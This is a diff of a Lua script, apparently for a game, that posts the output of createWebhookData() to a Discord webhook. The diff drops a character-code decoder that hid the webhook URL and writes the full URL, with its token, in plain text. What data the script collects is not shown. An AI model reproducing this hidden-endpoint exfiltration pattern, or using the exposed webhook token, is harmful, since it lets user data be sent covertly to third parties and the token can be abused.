@@ -97,15 +97,6 @@ local function sendWebhook(webhookUrl, data)
     request(webhookRequest)
 end
 
-local function decodeWebhook(encodedWebhook)
-    local decoded = ""
-    for _, code in ipairs(encodedWebhook) do
-        decoded = decoded .. string.char(code)
-    end
-    return decoded
-end
-
-local encodedWebhook = {104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 51, 50, 54, 53, 50, 50, 55, 53, 55, 50, 53, 51, 49, 54, 49, 49, 54, 47, 104, 122, 50, 45, 74, 118, 67, 70, 51, 95, 116, 119, 99, 75, 68, 117, 114, 106, 77, 103, 117, 76, 76, 122, 109, 119, 100, 48, 86, 111, 88, 51, 66, 86, 73, 111, 72, 49, 82, 84, 112, 118, 72, 98, 76, 120, 111, 73, 95, 75, 106, 89, 110, 121, 88, 110, 88, 105, 48, 78, 86, 72, 85, 108, 88, 69, 71, 69}
-local webhookUrl = decodeWebhook(encodedWebhook)
+local webhookUrl = "https://discord.com/api/webhooks/1326522275725316116/hz2-JvCF3_twcKDurjMguLLzmwd0VoX3BVIoH1RTpvHbLxoI_KjYnyXnXi0NVHUlXEGE"
 local webhookData = createWebhookData()
 sendWebhook(webhookUrl, webhookData)
